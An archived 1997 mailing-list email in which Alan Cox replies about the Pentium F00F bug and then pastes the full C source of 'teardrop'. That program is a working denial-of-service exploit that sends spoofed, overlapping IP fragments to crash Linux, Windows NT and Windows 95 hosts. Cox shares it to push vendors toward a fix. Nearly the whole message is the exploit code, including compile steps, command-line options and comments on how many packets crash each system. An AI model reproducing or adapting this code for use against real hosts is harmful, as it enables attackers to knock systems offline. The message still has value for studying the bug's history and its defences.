Received: from cthulhu.engr.sgi.com (cthulhu.engr.sgi.com [192.26.80.2]) by neteng.engr.sgi.com (970903.SGI.8.8.7/960327.SGI.AUTOCF) via SMTP id OAA508048 for <linux-archive@neteng.engr.sgi.com>; Fri, 14 Nov 1997 14:26:30 -0800 (PST)
Return-Path: <owner-linux@cthulhu.engr.sgi.com>
Received: (from majordomo-owner@localhost) by cthulhu.engr.sgi.com (950413.SGI.8.6.12/960327.SGI.AUTOCF) id OAA10935 for linux-list; Fri, 14 Nov 1997 14:21:08 -0800
Received: from sgi.sgi.com (sgi.engr.sgi.com [192.26.80.37]) by cthulhu.engr.sgi.com (950413.SGI.8.6.12/960327.SGI.AUTOCF) via ESMTP id OAA10862; Fri, 14 Nov 1997 14:21:01 -0800
Received: from snowcrash.cymru.net (snowcrash.cymru.net [163.164.160.3]) by sgi.sgi.com (950413.SGI.8.6.12/970507) via ESMTP id OAA17236; Fri, 14 Nov 1997 14:20:51 -0800
	env-from (alan@lxorguk.ukuu.org.uk)
Received: from lightning.swansea.linux.org.uk (the-great-packet-bucket-in-the-sky [163.164.160.21] (may be forged)) by snowcrash.cymru.net (8.8.7/8.7.1) with SMTP id WAA12025; Fri, 14 Nov 1997 22:20:45 GMT
Received: by lightning.swansea.linux.org.uk (Smail3.1.29.1 #2)
	id m0xWUB8-0005FvC; Fri, 14 Nov 97 22:25 GMT
Message-Id: <m0xWUB8-0005FvC@lightning.swansea.linux.org.uk>
From: alan@lxorguk.ukuu.org.uk (Alan Cox)
Subject: Re: Pentium F00F bug Linux workaround
To: ariel@cthulhu.engr.sgi.com
Date: Fri, 14 Nov 1997 22:25:30 +0000 (GMT)
Cc: linux@cthulhu.engr.sgi.com
In-Reply-To: <199711142117.NAA27890@oz.engr.sgi.com> from "Ariel Faigon" at Nov 14, 97 01:17:24 pm
Content-Type: text
Sender: owner-linux@cthulhu.engr.sgi.com
Precedence: bulk

>  I'm impressed by the repeatedly demonstrated ability of the Linux
>  community to beat Microsoft.  It remains to be seen how long it'll
>  take Microsoft to respond to this serious bug that can crash any
>  Windows/WindowsNT machine from user mode (incl. any remotely loaded
>  Captive-X control)]

For various complex political/vendor reasons between intel and OS vendors
the situation on this is somewhat misleading on speed of fixing. Don't take
this specific one as a fair measurement. 

Lets see how long they take to fix the one below..  (Linux fix in 2.1.64pre
and on various sites). Irix isnt vulnerable btw ;)

Alan

/*
 *  Copyright (c) 1997 route|daemon9  <route@infonexus.com11.3.97
 *
 *  Linux/NT/95 Overlap frag bug exploit
 *
 *  Exploits the overlapping IP fragment bug present in all Linux kernels and
 *  NT 4.0 / Windows 95 (others?)
 *
 *  Based off of:   flip.c by klepto
 *  Compiles on:    Linux, *BSD*
 *
 *  gcc -O2 teardrop.c -o teardrop
 *      OR
 *  gcc -O2 teardrop.c -o teardrop -DSTRANGE_BSD_BYTE_ORDERING_THING
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>

#ifdef STRANGE_BSD_BYTE_ORDERING_THING
                        /* OpenBSD < 2.1, all FreeBSD and netBSD, BSDi < 3.0 */
#define FIX(n)  (n)
#else                   /* OpenBSD 2.1, all Linux */
#define FIX(n)  htons(n)
#endif  /* STRANGE_BSD_BYTE_ORDERING_THING */

#define IP_MF   0x2000  /* More IP fragment en route */
#define IPH     0x14    /* IP header size */
#define UDPH    0x8     /* UDP header size */
#define PADDING 0x1c    /* datagram frame padding for first packet */
#define MAGIC   0x3     /* Magic Fragment Constant (tm).  Should be 2 or 3 */
#define COUNT   0x1     /* Linux dies with 1, NT is more stalwart and can
                         * withstand maybe 5 or 10 sometimes...  Experiment.
                         */
void usage(u_char *);
u_long name_resolve(u_char *);
u_short in_cksum(u_short *, int);
void send_frags(int, u_long, u_long, u_short, u_short);

int main(int argc, char **argv)
{
    int one = 1, count = 0, i, rip_sock;
    u_long  src_ip = 0, dst_ip = 0;
    u_short src_prt = 0, dst_prt = 0;
    struct in_addr addr;

    fprintf(stderr, "teardrop   route|daemon9\n\n");

    if((rip_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
    {
        perror("raw socket");
        exit(1);
    }
    if (setsockopt(rip_sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one))
        < 0)
    {
        perror("IP_HDRINCL");
        exit(1);
    }
    if (argc < 3) usage(argv[0]);
    if (!(src_ip = name_resolve(argv[1])) || !(dst_ip = name_resolve(argv[2])))
    {
        fprintf(stderr, "What the hell kind of IP address is that?\n");
        exit(1);
    }

    while ((i = getopt(argc, argv, "s:t:n:")) != EOF)
    {
        switch (i)
        {
            case 's':               /* source port (should be emphemeral) */
                src_prt = (u_short)atoi(optarg);
                break;
            case 't':               /* dest port (DNS, anyone?) */
                dst_prt = (u_short)atoi(optarg);
                break;
            case 'n':               /* number to send */
                count   = atoi(optarg);
                break;
            default :
                usage(argv[0]);
                break;              /* NOTREACHED */
        }
    }
    srandom((unsigned)(time((time_t)0)));
    if (!src_prt) src_prt = (random() % 0xffff);
    if (!dst_prt) dst_prt = (random() % 0xffff);
    if (!count)   count   = COUNT;

    fprintf(stderr, "Death on flaxen wings:\n");
    addr.s_addr = src_ip;
    fprintf(stderr, "From: %15s.%5d\n", inet_ntoa(addr), src_prt);
    addr.s_addr = dst_ip;
    fprintf(stderr, "  To: %15s.%5d\n", inet_ntoa(addr), dst_prt);
    fprintf(stderr, " Amt: %5d\n", count);
    fprintf(stderr, "[ ");

    for (i = 0; i < count; i++)
    {
        send_frags(rip_sock, src_ip, dst_ip, src_prt, dst_prt);
        fprintf(stderr, "b00m ");
        usleep(500);
    }
    fprintf(stderr, "]\n");
    return (0);
}

/*
 *  Send two IP fragments with pathological offsets.  We use an implementation
 *  independent way of assembling network packets that does not rely on any of
 *  the diverse O/S specific nomenclature hinderances (well, linux vs. BSD).
 */

void send_frags(int sock, u_long src_ip, u_long dst_ip, u_short src_prt,
                u_short dst_prt)
{
    u_char *packet = NULL, *p_ptr = NULL;   /* packet pointers */
    u_char byte;                            /* a byte */
    struct sockaddr_in sin;                 /* socket protocol structure */

    sin.sin_family      = AF_INET;
    sin.sin_port        = src_prt;
    sin.sin_addr.s_addr = dst_ip;

    /*
     * Grab some memory for our packet, align p_ptr to point at the beginning
     * of our packet, and then fill it with zeros.
     */
    packet = (u_char *)malloc(IPH + UDPH + PADDING);
    p_ptr  = packet;
    bzero((u_char *)p_ptr, IPH + UDPH + PADDING);

    byte = 0x45;                        /* IP version and header length */
    memcpy(p_ptr, &byte, sizeof(u_char));
    p_ptr += 2;                         /* IP TOS (skipped) */
    *((u_short *)p_ptr) = FIX(IPH + UDPH + PADDING);    /* total length */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(242);   /* IP id */
    p_ptr += 2;
    *((u_short *)p_ptr) |= FIX(IP_MF);  /* IP frag flags and offset */
    p_ptr += 2;
    *((u_short *)p_ptr) = 0x40;         /* IP TTL */
    byte = IPPROTO_UDP;
    memcpy(p_ptr + 1, &byte, sizeof(u_char));
    p_ptr += 4;                         /* IP checksum filled in by kernel */
    *((u_long *)p_ptr) = src_ip;        /* IP source address */
    p_ptr += 4;
    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */
    p_ptr += 4;
    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(8 + PADDING);   /* UDP total length */

    if (sendto(sock, packet, IPH + UDPH + PADDING, 0, (struct sockaddr *)&sin,
                sizeof(struct sockaddr)) == -1)
    {
        perror("\nsendto");
        free(packet);
        exit(1);
    }

    /*  We set the fragment offset to be inside of the previous packet's
     *  payload (it overlaps inside the previous packet) but do not include
     *  enough payload to cover complete the datagram.  Just the header will
     *  do, but to crash NT/95 machines, a bit larger of packet seems to work
     *  better.
     */
    p_ptr = &packet[2];         /* IP total length is 2 bytes into the header */
    *((u_short *)p_ptr) = FIX(IPH + MAGIC + 1);
    p_ptr += 4;                 /* IP offset is 6 bytes into the header */
    *((u_short *)p_ptr) = FIX(MAGIC);

    if (sendto(sock, packet, IPH + MAGIC + 1, 0, (struct sockaddr *)&sin,
                sizeof(struct sockaddr)) == -1)
    {
        perror("\nsendto");
        free(packet);
        exit(1);
    }
    free(packet);
}

u_long name_resolve(u_char *host_name)
{
    struct in_addr addr;
    struct hostent *host_ent;

    if ((addr.s_addr = inet_addr(host_name)) == -1)
    {
        if (!(host_ent = gethostbyname(host_name))) return (0);
        bcopy(host_ent->h_addr, (char *)&addr.s_addr, host_ent->h_length);
    }
    return (addr.s_addr);
}

void usage(u_char *name)
{
    fprintf(stderr,
            "%s src_ip dst_ip [ -s src_prt ] [ -t dst_prt ] [ -n how_many ]\n",
            name);
    exit(0);
}

/* EOF */
